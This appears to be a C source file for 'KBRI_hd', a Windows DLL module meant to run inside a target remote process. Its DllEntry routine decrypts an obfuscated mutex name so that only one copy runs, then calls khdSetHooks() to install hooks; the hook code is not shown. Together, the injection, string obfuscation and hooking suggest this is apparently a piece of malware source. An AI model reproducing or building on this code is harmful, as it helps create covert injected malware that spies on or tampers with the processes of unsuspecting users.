/*
	mod_KBRI_hd.c
	Main file for module KBRI_hd
	NB: stand-alone dll with all modules compiled locally (no ROUTINES_BY_PTR)

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\shared\ModuleAPI.h"

// internal code modules
#include "KBRI_hd.h"






#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif



#include "mod_KBRI_hd.h"


/*
	Checks if a specific mutex already exists 
*/
BOOL kbAreUniq()
{
	BOOL bRes = FALSE;
	LPWSTR wszName;

	wszName = CRSTRW("pg0DB75F67E1DBEF", "\xfc\xff\xd1\x02\xec\xff\xc1\x0d\xbc\xc3\x13\xbd\x59\x21\x47\x9d\x09\x76\x55\x88\x69\x61\xbb");

	if (!OpenMutex(SYNCHRONIZE, FALSE, wszName)) {

		CreateMutex(NULL, TRUE, wszName);

		bRes = TRUE;
	}

	my_free(wszName);

	return bRes;
}


// entrypoint function for module
// called as separate thread in context of a target remote process
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;	// need return TRUE to proceed next
	DWORD dwThreadId;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered, hinstDLL=%p lpvReserved=%p", hinstDLL, lpvReserved);

		// start work 
		if (kbAreUniq()) { khdSetHooks(); } else { DbgPrint("ERR: already exist"); bRes = FALSE; }

		DbgPrint("DLL_PROCESS_ATTACH: done");

	}	// DLL_PROCESS_ATTACH

	return bRes;
}






